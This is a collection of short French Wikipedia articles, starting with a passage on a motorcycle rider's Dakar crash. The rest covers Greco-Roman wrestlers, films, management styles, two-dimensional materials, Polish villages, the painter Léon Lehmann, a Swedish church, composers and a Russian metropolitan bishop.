Au mois de , il participe au Dakar. Très vite, il figure parmi les leaders de la catégorie des motos. Deuxième après les deux premières étapes, il connaît plus de difficultés durant la troisième avant de remporter la quatrième etape devant Xavier de Soultrait et profite par la même occasion de l'abandon de Sam Sunderland pour prendre la tête au classement général. Avant d'aborder la dixième étape, il compte vingt-deux secondes d'avance sur l'argentin Kevin Benavídes et plus de six minutes trente sur l'autrichien Matthias Walkner. Durant l'étape, il parvint a trouver la bonne piste pendant que la plupart de ses rivaux directs peinaient à retrouver leur chemin. À trois kilomètres de l'arrivée, avec l'ambition de creuser un écart définitif sur ses concurrents, il est victime d'une terrible chute qui lui casse la clavicule, lui perce le poumon et lui brise trois côtes. Cette chute anéantit ses espoirs de première victoire sur le rallye.
En 2022, il passe de Yamaha à Honda en cours de saison et enchaîne les bons résultats jusqu'à obtenir sa première victoire dans une manche du championnat du monde de rallye-raid FIM lors du .
Palmarès.
"Source"

</doc>
<doc id="8732116" url="https://fr.wikipedia.org/wiki?curid=8732116" title="Dennis Koslowski">
Dennis Koslowski

Dennis Koslowski est un lutteur américain spécialiste de la lutte gréco-romaine né le à Watertown.
Biographie.
Lors des Jeux olympiques d'été de 1988, il remporte la médaille de bronze en combattant dans la catégorie des - kg. Lors des Jeux olympiques d'été de 1992, il remporte la médaille d'argent en combattant dans la catégorie des - kg.

</doc>
<doc id="8732117" url="https://fr.wikipedia.org/wiki?curid=8732117" title="Haber-Bosch (histoire du procédé)">
Haber-Bosch (histoire du procédé)



</doc>
<doc id="8732137" url="https://fr.wikipedia.org/wiki?curid=8732137" title="La Falaise argentée">
La Falaise argentée

La Falaise argentée ("O Abismo Prateado") est un film dramatique brésilien réalisé par Karim Aïnouz, sorti en 2011. 
Il fait partie de la sélection de la Quinzaine des réalisateurs au Festival de Cannes 2011.
Synopsis.
Violeta, dentiste, est mariée à Djalma et a un enfant. En écoutant un message sur son répondeur, elle apprend que son mari la quitte pour aller à Porto Alegre.

</doc>
<doc id="8732149" url="https://fr.wikipedia.org/wiki?curid=8732149" title="Bill Quillian">
Bill Quillian



</doc>
<doc id="8732155" url="https://fr.wikipedia.org/wiki?curid=8732155" title="Tomas Johansson">
Tomas Johansson

Tomas Johansson est un lutteur suédois spécialiste de la lutte gréco-romaine né le à Haparanda.
Biographie.
Aux Jeux olympiques d'été de 1984, il remporte initialement la médaille d'argent en catégorie des plus de 100 kg, mais il sera déclassé pour dopage. 
Lors des Jeux olympiques d'été de 1988, il remporte la médaille de bronze en combattant dans la catégorie des plus de . Lors des Jeux olympiques d'été de 1992, il remporte la médaille d'argent en combattant dans la catégorie des plus de . Il remporte le titre mondial en 1986.

</doc>
<doc id="8732159" url="https://fr.wikipedia.org/wiki?curid=8732159" title="Ce n'è per tutti">
Ce n'è per tutti

 (que l'on peut traduire par : "Il y en a pour tout le monde") est un film italien réalisé par , sorti en 2009.
Synopsis.
Un garçon, Gianluca, grimpe sur le Colisée à Rome. Sous lui, ses amis et les médias cherchent à comprendre ce qui se passe.
Ce film est une réflexion sur ce qui peut conduire au suicide, créant dans un même temps sourire et questionnement chez le spectateur.

</doc>
<doc id="8732164" url="https://fr.wikipedia.org/wiki?curid=8732164" title="La Montagne magique (manga)">
La Montagne magique (manga)

 est un manga de Jirō Taniguchi de type seinen.
Synopsis.
Un garçon d'environ 11 ans se retrouve avec sa sœur chez ses grands-parents après la mort de leur père, et alors que leur mère va se faire opérer d'une maladie grave. Un grand bouleversement va changer sa vie.
Il découvre une salamandre avec qui il a le pouvoir de parler, et qui peut exaucer un vœu. Les deux enfants lui demandent que leur mère revienne au plus vite…

</doc>
<doc id="8732169" url="https://fr.wikipedia.org/wiki?curid=8732169" title="Mandat d'arrêt (film, 1968)">
Mandat d'arrêt (film, 1968)

Mandat d'arrêt (titre original : ") est un film britannique de Ralph Thomas sorti en 1968.
Synopsis.
Le sergent Scobie Malone de la New South Wales Police Force est convoqué à Sydney par le Premier ministre de la Nouvelle-Galles du Sud, M. Flannery, qui lui demand de se rendre à Londres pour d’arrêter le haut diplomate australien Sir James Quentin. Ce dernier, qui occupe le poste de haut-commissaire au Royaume-Uni, est un rival politique du premier ministre en plus d'être le seul suspect dans une affaire de meurtre vieille de 17 ans.
À son arrivée au haut-commissariat australien, Malone rencontre Lady Quentin et son mari, ainsi que le secrétaire de Sir James. Celui-ci ne s’oppose pas à son appréhension mais demande quelques jours pour conclure des négociations de paix délicates. Alors que Malone attend en tant qu’invité de la Haute Commission, il découvre un complot visant à assassiner Sir James, orchestré par le chef d’un dangereux réseau d’espionnage, Maria Cholon.

</doc>
<doc id="8732176" url="https://fr.wikipedia.org/wiki?curid=8732176" title="Styles de management">
Styles de management

Les styles de management (de proximité) ou « styles de leadership » ou encore « styles de direction » sont les différentes façons dont un manageur ou un dirigeant peut manager ou diriger ses subordonnés ou les membres de son équipe ou, par extension, de son entreprise.
Ce sont Rensis Likert, Tannenbaum et Schmidt et Blake et Mouton qui ont introduit la notion à côté de celles des traits et des compétences.
Daniel Goleman parle, lui, de style de leadership. Et Alexandre Havard parle de leadership vertueux.
Le leadership vertueux est différent du leadership institutionnel qui selon Havard, passe par l'épanouissement personnel. Leadership et vertu sont liés parce que la vertu crée la confiance, et permet au leader de faire ce que les gens attendent de lui. Il distingue le leader, qui fait avancer les hommes, du manageur, qui fait avancer les choses
Le continuum de Tannenbaum et Schmidt.
Dans un article paru en 1973 (à la suite d'un précédent travail de 1958) dans la revue Harvard Business, Tannenbaum et Schmidt exposent une grille de leadership sur un axe allant de l’autocratie à la démocratie et l’autonomie des subordonnés. 

</doc>
<doc id="8732187" url="https://fr.wikipedia.org/wiki?curid=8732187" title="Jean-Dominique Luciani">
Jean-Dominique Luciani

Jean-Dominique Luciani, né le à Partinello, village qui dépendait à l’époque de la commune d’Evisa (Corse) et mort en juillet 1932, a mené une carrière administrative en Algérie et a rédigé différents ouvrages juridiques, ethnographiques et littéraires concernant sa terre d’accueil. 
Biographie.
Jean-Dominique Luciani faisait partie des familles corses bien implantées dans l’administration coloniale, il était le neveu de Santino Luciani, Secrétaire Général de Préfecture de Constantine, originaire d’Evisa (Corse) et l'oncle de Xavier Coppolani, Secrétaire Général des Colonies Mauritanie, originaire de Marignana (Corse)
Gabriel Esquer a rédigé une biographie en 1933 : "M. Dominique Luciani (1851-1932)" (Ed. Société Historique Algérienne) ; cet ouvrage recense les différents travaux menés par Dominique Luciani.
Une ville Algérienne Takhemaret a repris le nom de Dominique Luciani en 1933, ainsi qu’un Lycée de Philippeville.
Carrière administrative.
Après avoir obtenu son baccalauréat ès-lettres (a été élève au collège d’Ajaccio), il intègre l’administration en tant que commis rédacteur en . Il s'engage dans les tirailleurs algériens et fait campagne en Kabylie jusqu'à sa libération en .
En parallèle à ses activités professionnelles, il mène des études de droit et d'arabe (Licence à la Faculté de droit d'Aix, diplôme des pour connaissance des langues arabes et kabyle).
Il a assuré plusieurs responsabilités administratives :
Retraité en 1919, il eut d’autres responsabilités locales : 
Il fut, en outre, vice-président en 1923, puis président en 1927 de la Société historique algérienne. Il était aussi membre de la Société archéologique de Constantine.
Traductions, ouvrages juridiques et ethnographiques.
On lui doit aussi différents articles dans la "Revue africaine" entre 1893 et 1929.

</doc>
<doc id="8732189" url="https://fr.wikipedia.org/wiki?curid=8732189" title="Matériau bidimensionnel">
Matériau bidimensionnel

Un matériau bidimensionnel, parfois appelé matériau monocouche ou matériau 2D, est un matériau constitué d'une seule couche d'atomes ou de molécules.
Depuis l'isolement du graphène (une seule couche de graphite) en 2004, beaucoup de recherches ont été réalisées pour isoler d'autres matériaux bidimensionnels en raison de leurs caractéristiques inhabituelles et pour une potentielle utilisation dans des applications telles que le photovoltaïque, les semi-conducteurs et la purification de l'eau. Les matériaux bidimensionnels (2D) constitués de cristaux d’une épaisseur de quelques atomes, présentent des propriétés remarquables par rapport à leurs homologues tridimensionnels (3D) en vrac.
Spécificités.
Ces matériaux se distinguent de leur shomologues en 3D par des proprétés particulières, et notamment par une meilleure conductivité électrique, une flexibilité accrue, des bandes interdites modulables et une aptitude supérieure à la miniaturisation des dispositifs électroniques. 
Ces caractéristiques les rendent prometteurs pour le développement de systèmes avancés tels que les dispositifs de calcul neuromorphique et les architectures de calcul en mémoire, utiles pour l'intelligence artificielle.
Classification.
Les matériaux bidimensionnels peuvent généralement être classés en deux groupes :

</doc>
<doc id="8732197" url="https://fr.wikipedia.org/wiki?curid=8732197" title="Thomas Moule">
Thomas Moule

Thomas Moule (1784 - ) est un antiquaire, écrivain spécialisé en héraldique et cartographe anglais. Il est surtout connu pour ses cartes populaires et richement décorées des comtés d'Angleterre, gravées sur acier et d'abord publiées séparément entre 1830 et 1832.
Moule naît dans le quartier de Marylebone à Londres. Il vend des livres dans Duke Street, place Grosvenor Square, de 1816 à 1822. Plus tard, il devient inspecteur des « lettres aveugles » (aux adresses illisibles) au General Post Office. Il meurt à sa résidence située dans le palais de St.James, à laquelle il a droit en tant que gardien de la Chambre au département du Lord Chambellan.

</doc>
<doc id="8732200" url="https://fr.wikipedia.org/wiki?curid=8732200" title="Rangel Gerovski">
Rangel Gerovski

Rangel Gerovski est un lutteur bulgare spécialiste de la lutte gréco-romaine né le à Karlovo (Bulgarie) et mort le à Sofia.
Biographie.
Lors des Jeux olympiques d'été de 1988, il remporte la médaille d'argent en combattant dans la catégorie des + kg.

</doc>
<doc id="8732207" url="https://fr.wikipedia.org/wiki?curid=8732207" title="Ligue mondiale masculine de water-polo 2015">
Ligue mondiale masculine de water-polo 2015

La Ligue mondiale 2015 est la quatorzième édition de la Ligue mondiale de water-polo masculin, compétition annuelle organisée par la Fédération internationale de natation (FINA).
Chaque zone continentale organise des qualifications entre équipes invitées à participer. Leurs huit vainqueurs participent à une super finale, organisée du 23 au à Bergame, en Italie.
Équipes participant à la super finale.
Le règlement pour 2014 prévoit trois qualifiés pour l’Europe, quatre qualifiés pour le reste du monde et la qualification automatique de l’équipe de la fédération hôte.
Organisation.
Chaque fédération participe verse dollars des États-Unis de frais de participation. La prime minimale est de dollars pour les équipes non qualifiées et celle terminant huitième de la super finale. Elle augmente de en dollars jusqu'à la quatrième place. Les trois premiers de la super finale remportent respectivement , et pour le vainqueur.
Qualifications.
Les équipes nationales sont invitées par la FINA à participer aux qualifications de la Ligue mondiale d'après leurs résultats ou leurs progrès récents. Ces qualifications sont organisées par zone continentale ou par regroupement de plusieurs zones continentales selon le nombre d'équipes participantes. Qu'elles soient jouées en matches aller-retour ou en tournoi d’une semaine, les qualifications supposent que chaque équipe joue deux fois contre ses adversaires.
Les matches ne peuvent pas se terminer sur un score d'égalité. Une séance de tirs au but (« T ») départagent les équipes. Dans ce cas-là, le vainqueur marque deux points au classement et le perdant un point, au lieu respectivement de trois points et zéro point en cas de score inégal.
Tournoi Intercontinental.
La FINA prévoit un tournoi de qualification du au aux États-Unis.
Europe.
Les treize équipes européennes invitées sont réparties en trois groupes à l'intérieur desquels les équipes se rencontrent en matches aller et retour entre le et le .
Le premier de chaque groupe se qualifie pour la super finale.
Super finale.
La super finale entre les huit qualifiés a lieu du 23 au , à Bergame, en Italie. 
Phase préliminaire.
Les classements de groupe au terme de la phase préliminaire permettent de constituer les quarts de finale.

</doc>
<doc id="8732219" url="https://fr.wikipedia.org/wiki?curid=8732219" title="Trois Jours de Flandre-Occidentale 2015">
Trois Jours de Flandre-Occidentale 2015

La des Trois Jours de Flandre-Occidentale a eu lieu du 6 au . La course fait partie du calendrier UCI Europe Tour 2015 en catégorie 2.1.
Elle a été remportée par le Belge Yves Lampaert (Etixx-Quick Step), vainqueur de la première étape, respectivement huit et douze secondes devant le Russe Anton Vorobyev (Katusha), lauréat du prologue, et le Néo-Zélandais Jesse Sergent (Trek Factory Racing).
Lampaert remporte les classements par points, du meilleur jeune et du meilleur coureur de la Flandre-Occidentale. Le Néerlandais Tim Kerkhof (Roompot) remporte celui des sprints et la formation belge Etixx-Quick Step le classement par équipes.
Présentation.
Équipes.
Classés en catégorie 2.1 de l'UCI Europe Tour, les Trois Jours de Flandre-Occidentale sont par conséquent ouverts aux WorldTeams dans la limite de 50 % des équipes participantes, aux équipes continentales professionnelles, aux équipes continentales et aux équipes nationales.
L'organisateur a communiqué la liste des équipes invitées le . Vingt-quatre équipes participent à ces Trois Jours de Flandre-Occidentale - huit WorldTeams, onze équipes continentales professionnelles et cinq équipes continentales :
Étapes.
L'édition 2015 des Trois Jours de Flandre-Occidentale comporte un prologue disputé à Middelkerke sous la forme d'un contre-la-montre individuel de sept kilomètres et deux étapes en ligne longues de respectivement 174,1 et , pour un total de à parcourir.
Déroulement de la course.
Prologue.
Le prologue est disputé à Middelkerke sous la forme d'un contre-la-montre individuel de sept kilomètres. Le premier coureur part à , les autres se succèdent toutes les minutes.
La relie Bruges à Harelbeke en . Elle est constituée d'un circuit de et d'un circuit local de à parcourir à quatre reprises. Le départ est donné à .
La relie Nieuport à Ichtegem en . Elle est constituée d'un circuit principal de et d'un circuit local de à parcourir à trois reprises. Le départ est donné à .
Classements finals.
UCI Europe Tour.
Ces Trois Jours de Flandre-Occidentale attribuent des points pour l'UCI Europe Tour 2015, par équipes seulement aux coureurs des équipes continentales professionnelles et continentales, individuellement à tous les coureurs sauf ceux faisant partie d'une équipe ayant un label WorldTeam.
Liste des participants.
 

</doc>
<doc id="8732231" url="https://fr.wikipedia.org/wiki?curid=8732231" title="Coupe de France de cyclisme sur route 2015">
Coupe de France de cyclisme sur route 2015

La Coupe de France de cyclisme sur route 2015 est la de la Coupe de France de cyclisme sur route. Elle a débuté le février avec le Grand Prix d'ouverture La Marseillaise et s'est terminée le 4 octobre avec le Tour de Vendée. Pour cette édition, la Roue tourangelle et le Grand Prix de Fourmies sont intégrés au calendrier de la Coupe de France. Ils remplacent numériquement le Grand Prix de la Somme et Châteauroux Classic de l'Indre (course annulée).
Attribution des points.
Classements individuels.
Seuls les coureurs français et les coureurs étrangers des équipes françaises marquent des points correspondant à leur classement réel dans chaque épreuve. Le classement général s'établit par l'addition des points ainsi obtenus. Les coureurs de moins de 25 ans concourent pour le classement du meilleur jeune.
Classement par équipes.
Le classement par équipes est établi de la manière suivante. Lors de chaque course, on additionne les places des trois premiers coureurs de chaque équipe. L'équipe avec le total le plus faible reçoit 12 points au classement des équipes, la deuxième équipe en reçoit neuf, la troisième équipe en reçoit huit et ainsi de suite jusqu'à la neuvième équipe qui marque deux points. Seules les équipes françaises marquent des points.

</doc>
<doc id="8732232" url="https://fr.wikipedia.org/wiki?curid=8732232" title="Christcore">
Christcore



</doc>
<doc id="8732236" url="https://fr.wikipedia.org/wiki?curid=8732236" title="Christian hardcore">
Christian hardcore



</doc>
<doc id="8732243" url="https://fr.wikipedia.org/wiki?curid=8732243" title="Canton de Saint-Benoît">
Canton de Saint-Benoît



</doc>
<doc id="8732280" url="https://fr.wikipedia.org/wiki?curid=8732280" title="Out Ag'in, in Ag'in">
Out Ag'in, in Ag'in

 est un film muet américain réalisé par Larry Semon et sorti en 1916.

</doc>
<doc id="8732302" url="https://fr.wikipedia.org/wiki?curid=8732302" title="Société des antiquaires de l’Ouest">
Société des antiquaires de l’Ouest



</doc>
<doc id="8732309" url="https://fr.wikipedia.org/wiki?curid=8732309" title="Aleksandra Kazała">
Aleksandra Kazała

Aleksandra Kazała est une joueuse de volley-ball polonaise née le à Dębica. Elle mesure et joue au poste de réceptionneuse-attaquante. 

</doc>
<doc id="8732363" url="https://fr.wikipedia.org/wiki?curid=8732363" title="Czubin">
Czubin

Czubin (prononciation : ) est un village polonais de la gmina de Brwinów dans le powiat de Pruszków de la voïvodie de Mazovie dans le centre-est de la Pologne.
Il se situe à environ 5 kilomètres au nord-ouest de Brwinów (siège de la "gmina"), 10 kilomètres à l'ouest de Pruszków (siège du "powiat") et à 24 kilomètres à l'ouest de Varsovie (capitale de la Pologne).
Le village compte approximativement une population de 214 habitants en 2012.
Histoire.
De 1975 à 1998, le village appartenait administrativement à la voïvodie de Varsovie.

</doc>
<doc id="8732373" url="https://fr.wikipedia.org/wiki?curid=8732373" title="Frankie Thomas">
Frankie Thomas

Frankie Thomas Jr. est un acteur et écrivain américain, né à New York le , décédé d'un cancer à Los Angeles (Californie) le .
Il est le fils des acteurs Frank M. Thomas et Mona Bruns. Son oncle, Calvin Thomas, était aussi acteur.
Biographie.
Frankie Thomas Jr. apparait dans de nombreux films et séries tout au long des années 1930 à 1950. Vers la fin de sa vie, il écrit également un certain nombre de romans mettant en scène Sherlock Holmes.

</doc>
<doc id="8732429" url="https://fr.wikipedia.org/wiki?curid=8732429" title="Liste de projets de recherche d'exoplanètes">
Liste de projets de recherche d'exoplanètes



</doc>
<doc id="8732437" url="https://fr.wikipedia.org/wiki?curid=8732437" title="Léon Lehmann">
Léon Lehmann

 
Léon Lehmann, né le à Altkirch (Haut-Rhin) et mort le dans la même ville, est un peintre français.
Biographie.
Originaire du Sundgau comme le peintre et académicien Jean-Jacques Henner qui le recommande auprès de l'École nationale supérieure des beaux-arts de Paris, Léon Lehmann entre en 1892 dans l'atelier de Gustave Moreau. Il y côtoie Henri Matisse, Albert Marquet, Albert Huyot, Henri Manguin, Raoul de Mathan et Georges Rouault dont il deviendra le grand ami. L'enseignement très exigeant de Moreau, qui les pousse à copier les maîtres au musée du Louvre mais respecte aussi la sensibilité propre de chaque élève, amène Léon Lehmann à se passionner pour les sujets militaires qu'il traduit dans des dessins et des toiles qui sont remarqués et salués : il obtient une première mention et le deuxième prix de l'école au concours d'atelier, ainsi que l'exposition de sa "Reconnaissance de cavalerie" au Salon des artistes français de 1894.
Revenu épuisé de son service militaire en 1895, il tente de reprendre laborieusement ses recherches artistiques et s'isole en 1900 à l'abbaye Notre-Dame d'Acey près de Besançon où il peint quelques paysages et natures mortes. De passage à Paris, il croise Rouault qui le pousse à y revenir et l'héberge dans sa famille pendant près de 14 ans. Léon Lehmann découvre alors le renouveau pictural français en cours (pointillisme, fauvisme, cubisme, expressionnisme…) qu'il exprime dans certaines de ses toiles, mais sans jamais y céder vraiment. Il attire l'attention des galeries parisiennes Berthe Weill puis Druet qui l'exposent aux côtés d'artistes déjà prometteurs (Henri Matisse, Raoul Dufy, Kees van Dongen, Albert Marquet, Rouault, Jean Puy, Henri Manguin …). 
La Première Guerre mondiale le stoppe brutalement dans son élan artistique. Il revient gravement malade du front et ce n'est qu'après son mariage en 1921 qu'il retrouve toute la force et l'inspiration nécessaires pour se remettre pleinement au travail. Il s'installe alors avenue de la Motte-Picquet et renoue avec la galerie Druet qui l'expose à nouveau aux côtés de Albert Marquet, Jean Puy, Henri Manguin, Charles Camoin, Othon Friesz… puis avec la galerie Eugène Blot qui l'expose régulièrement à partir de 1928. Son tempérament s'affirme alors pleinement, dans une voie très personnelle, intime, d'inspiration souvent mystique, au lyrisme bouillonnant. Le Salon d'automne le met à l'honneur en 1936, en consacrant une salle entière à ses œuvres et une préface du catalogue par Louis Vauxcelles. 
Parfois sombre dans les années 1920, sa palette s'illumine de plus en plus au fil du temps. Conservant une grande diversité de technique (brosse ou couteau, pâte lisse ou grumeleuse), il excelle dans les combinaisons de lumière jouant souvent sur des contre-jours ou des clairs-obscurs, et la juxtaposition de tons rares . Certains lui trouvent une parenté avec Pierre Bonnard et Édouard Vuillard. Il se plaît à peindre quelques portraits, mais se consacre surtout à des paysages, des scènes d'intérieur et des natures mortes qu'il réalise à Paris, dans sa résidence d'été à Ferrette, dans ses lieux de vacances à Porquerolles, Douy en Sologne ou Noirmoutiers, et à la fin de sa vie à Altkirch où il est revenu habiter en 1946. À partir de 1947, Katia Granoff l'expose dans sa galerie parisienne de la place Beauvau et lui reste fidèle jusqu'à sa mort.
Vers la fin de sa vie, la lumière envahit ses toiles, les lignes s'étirent de plus en plus, les formes se disloquent. Dans des transparences givrées, il suggère plus le réel qu'il ne le décrit, poussant la composition aux limites de l'abstraction. Sa dernière grande œuvre est l'ensemble des sept grandes toiles de la chapelle des Voirons (Haute-Savoie) qu'il achevait quand il mourut le . Ces tableaux sont aujourd'hui conservés au musée du Vatican où ils furent exposés pendant plusieurs décennies, jusqu'en 2003. 
Ses tableaux et dessins sont présents dans de nombreux musées en France (Altkirch, Belfort, Besançon, Colmar, Grenoble, Mulhouse, Paris, Poitiers, Strasbourg, Troyes…), mais aussi en Europe et outre-Atlantique (Belgique, Cardiff-Pays de Galles, Vatican, Moscou, Suisse, États-Unis…).
Œuvres dans les collections publiques.
Des œuvres de Léon Lehmann sont répertoriées en Belgique, aux États-Unis et en Suisse. 

</doc>
<doc id="8732487" url="https://fr.wikipedia.org/wiki?curid=8732487" title="Église de la Révélation de Saltsjöbaden">
Église de la Révélation de Saltsjöbaden

L'église de la Révélation () est un lieu de culte luthérien, église paroissiale de la localité de Saltsjöbaden, station balnéaire créée de toutes pièces à la fin du dans la grande banlieue sud-est de Stockholm et appartenant à la commune de Nacka.
Historique et architecture.
L'édifice a été réalisé dans les années 1910 à 1913 sur les plans de l'architecte Ferdinand Boberg. Sa construction a été financée par le banquier banquier Knut Agathon Wallenberg, qui les années précédentes avait donné naissance à Saltsjöbaden. Elle a été consacrée le , jour du de son donateur.
Par la même occasion a été inaugurée la nouvelle paroisse de Saltsjöbaden, détachée de celle de Nacka.
Le style architectural de ce sanctuaire associe inspiration national-romantique avec un vocabulaire formel Art nouveau. En cela, elle est très similaire à l'église d'Engelbrekt de Stockholm, certes beaucoup plus grande, mise en chantier un peu avant et achevée peu après. Comme celle-ci, elle présente un plan asymétrique avec sa tour élevée latéralement, elle est bâtie en brique fumée de Helsingborg soulignée de corniches et d'arêtes en cuivre vert, et repose sur des soubassements de granit brut.
La décoration.
Plusieurs artistes suédois parmi les plus en vue ont été choisis pour prendre part à la décoration de l'édifice, exécutée sur les indications du pasteur Nathan Söderblom (qui allait peu après, en 1914, devenir archevêque primat de Suède). Les fresques figuratives sont signées de Olle Hjortzberg. Le sculpteur Carl Milles a réalisé les bas-relief ornant les portes d'entrée en bronze, ainsi que les deux chapiteaux de granit, ornés chacun d'un visage d'ange, qui supportent le linteau du porche, et quatre reliefs en albâtre pour l'autel. Ce dernier, en marbre de Carrare, a été réalisé par Ferdinand Boberg lui-même.
Milles a également sculpté les fonts baptismaux, qui se présentent comme un bloc massif de granit sombre décoré de motifs inspirés du style roman archaïque de Gotland ou de Suède du sud. Ces fonts occupent une place très inhabituelle, sous la croisée du transept, au pied des marches menant à l'autel, ce qui en fait le véritable cœur de l'édifice.

</doc>
<doc id="8732505" url="https://fr.wikipedia.org/wiki?curid=8732505" title="Domaniew (Mazovie)">
Domaniew (Mazovie)

Domaniew (prononciation : ) est un village polonais de la gmina de Brwinów dans le powiat de Pruszków de la voïvodie de Mazovie dans le centre-est de la Pologne.
Il se situe à environ 6 kilomètres au nord-est de Brwinów (siège de la "gmina"), 3 kilomètres au nord-ouest de Pruszków (siège du "powiat") et à 17 kilomètres à l'ouest de Varsovie (capitale de la Pologne).
Le village compte approximativement une population de 343 habitants en 2012.
Histoire.
De 1975 à 1998, le village appartenait administrativement à la voïvodie de Varsovie.

</doc>
<doc id="8732512" url="https://fr.wikipedia.org/wiki?curid=8732512" title="Domaniew">
Domaniew

En , Domaniew peut désigner :

</doc>
<doc id="8732513" url="https://fr.wikipedia.org/wiki?curid=8732513" title="Saison 9 de New York, section criminelle">
Saison 9 de New York, section criminelle

Cet article présente la neuvième saison de la série policière New York, section criminelle.
Synopsis de la saison.
Cette série met en scène une unité d'élite chargée d'enquêter sur des meurtres extrêmement violents en cernant la psychologie des meurtriers.

</doc>
<doc id="8732527" url="https://fr.wikipedia.org/wiki?curid=8732527" title="Domaniewek (Mazovie)">
Domaniewek (Mazovie)

Domaniewek (prononciation : ) est un village polonais de la gmina de Brwinów dans le powiat de Pruszków de la voïvodie de Mazovie dans le centre-est de la Pologne.
Il se situe à environ 7 kilomètres au nord-est de Brwinów (siège de la "gmina"), 4 kilomètres au nord-ouest de Pruszków (siège du "powiat") et à 17 kilomètres à l'ouest de Varsovie (capitale de la Pologne).
Le village compte approximativement une population de 230 habitants en 2012.
Histoire.
De 1975 à 1998, le village appartenait administrativement à la voïvodie de Varsovie.

</doc>
<doc id="8732534" url="https://fr.wikipedia.org/wiki?curid=8732534" title="Roman Palester">
Roman Palester

Roman Palester est un pianiste, compositeur polonais de musique de film et symphonies, né le et mort le .
Biographie.
Roman Palester joue du piano dès l'âge de sept ans. Il fait ses études à l'Institut de musique de Cracovie en 1919-1921, au Conservatoire de Lwów en 1921-1925, et à l'École nationale supérieure de musique de Varsovie en 1928-1931, où il est notamment élève de Kazimierz Sikorski.
En 1930, il présente avec succès sa composition "Muzyka symfoniczna" à Varsovie, puis, à Londres lors du Festival international de la société de musique contemporaine. Il voyage beaucoup en Europe et reçoit parmi d'autres récompenses la médaille d'or de l'Exposition universelle de 1937, pour sa musique du ballet "Pieśń o ziemi".
En 1941-1945, il enseigne à l'Académie de musique de Cracovie. Il part s'installer à Paris en 1949, après le congrès de l'union des compositeurs polonais lors duquel il est accusé de formalisme dans le contexte du réalisme socialiste grandissant. Il vit à Munich de 1952 à 1972, où il dirige le département de la culture de la section polonaise de Radio Free Europe. Ses compositions en Pologne restent interdites jusqu'en 1977.
Mort à Paris, il est enterré au cimetière de Montmorency.

</doc>
<doc id="8732535" url="https://fr.wikipedia.org/wiki?curid=8732535" title="Domaniewek">
Domaniewek

Domaniewek peut désigner :
Toponymie.
en Pologne

</doc>
<doc id="8732540" url="https://fr.wikipedia.org/wiki?curid=8732540" title="Hal Schaefer">
Hal Schaefer

Hal Schaefer, de son vrai nom Harold Herman Schaefer, né le à New York dans le district de Columbia, et mort à Fort Lauderdale en Floride le , est un pianiste de jazz et compositeur de musique de films américain.
Biographie.
Jazz.
Au début des années 1940, Hal Schaefer joue dans des formations de jazz. Vers 1950, il s'établit en Californie, avant de revenir à New York en 1955. À partir de cette date, il enregistre plusieurs disques sous son nom, dont en 1955, un album dans la série "RCA Jazz Workshop", sorti l'année suivante, avec Hal McKusick, Phil Woods, Nick Travis, Milt Hinton ou Osie Johnson.
Cinéma.
Alors qu'il réside en Californie, Schaefer devient compositeur de musique de film pour Hollywood. En 1953, il est coach vocal de Marilyn Monroe. Le 17 juillet 1954, pendant le tournage du film La Joyeuse Parade de Walter Lang, il tente de se suicider en absorbant des comprimés de Benzedrine et de Nembutal dissous dans de l'alcool et un produit de nettoyage pour machine à écrire ! Il se savait alors filé par Joe DiMaggio, furieux d'avoir découvert que son épouse entretenait une liaison adultérine avec lui. Grâce à l'intervention rapide et efficace d'amis, Hal Schaefer survit, mais son foie et ses reins sont gravement endommagés.
Il a également travaillé avec d'autres actrices, Jane Russell, Susan Hayward, Betty Grable.

</doc>
<doc id="8732541" url="https://fr.wikipedia.org/wiki?curid=8732541" title="Falęcin (Pruszków)">
Falęcin (Pruszków)

Falęcin (prononciation : ) est un village polonais de la gmina de Brwinów dans le powiat de Pruszków de la voïvodie de Mazovie dans le centre-est de la Pologne.
Il se situe à environ 4 kilomètres à l'ouest de Brwinów (siège de la "gmina"), 10 kilomètres à l'ouest de Pruszków (siège du "powiat") et à 24 kilomètres à l'ouest de Varsovie (capitale de la Pologne).
Le village comptait approximativement 85 habitants en 2012.
Histoire.
De 1975 à 1998, le village appartenait administrativement à la voïvodie de Varsovie.

</doc>
<doc id="8732548" url="https://fr.wikipedia.org/wiki?curid=8732548" title="Grudów">
Grudów

Grudów (prononciation : ) est un village polonais de la gmina de Brwinów dans le powiat de Pruszków de la voïvodie de Mazovie dans le centre-est de la Pologne.
Le village compte approximativement une population de 75 habitants en 2012.
Histoire.
De 1975 à 1998, le village appartenait administrativement à la voïvodie de Varsovie.

</doc>
<doc id="8732615" url="https://fr.wikipedia.org/wiki?curid=8732615" title="Jonas Syssoïevitch">
Jonas Syssoïevitch

Jonas Syssoïevitch (en russe : Иона (III) Сысоевич) (env.1607 — ) est un évêque orthodoxe, métropolite de l'éparchie de Rostov et Iaroslavl durant les années 1652 à 1690, proche collaborateur du patriarche Nikon. C'est lui qui est à l'origine des nombreuses constructions, restaurations et ajoutes d'annexes diverses telles que celles du Kremlin de Rostov, celles du Monastère Saint-Boris-et-Saint-Gleb (Borissoglebski), de la Cathédrale de la Dormition de Iaroslavl, du Monastère de Tolga à Iaroslavl, du monastère de la Résurrection à Ouglitch et de la Cathédrale Michel-Archange à Veliki Oustioug.
Biographie.
Jonas Syssoïevitch est né aux environs de l'an 1607 dans la famille du pope Sysoe, servant dans la paroisse d'Angelovo, non loin de la ville de Rostov Veliki.
Il fut moine au Monastère de la Résurrection de la ville d'Ouglitch. Puis il devient archimandrite du Monastère de Belogostitski, puis de 1646 à 1652 du Monastère de l'Épiphanie d'Abraham.
Le Jonas est ordonné évêque par le patriarche de Moscou et de toute la Russie Nikon et élevé à la dignité de métropolite de l'éparchie de Rostov et de Iaroslavl. En 1654 et 1656 il est présent également à Moscou pour le Concile chargé de corriger les textes des livres de l'Église. Il partage sa longue vie d'ecclésiastique actif entre Moscou, Iaroslavl et Rostov.
Il meurt le et est inhumé dans la cathédrale de la Dormition de Rostov. Le successeur de Jonas fut Ioasaf Lazarevitch qui poursuit l'action de son prédécesseur, édificateur de cathédrales.
Les constructions.
Le métropolite Jonas fut un grand bâtisseur. Avec le patriarche Nikon il est la plus importante figure de mécène ecclésiastique du . Presque toutes les constructions ou les restaurations du Kremlin de Rostov, d'Ouglitch, et de Borissoglebski sont dues à son activité. Le Monastère de la Résurrection (Ouglitch), consacré en 1674, peut être considéré comme la première ébauche du Kremlin de Rostov. C'est un des ensembles les plus imposants de l'ancienne architecture russe. L'église, le réfectoire et les clochers forment un tout remarquablement homogène.
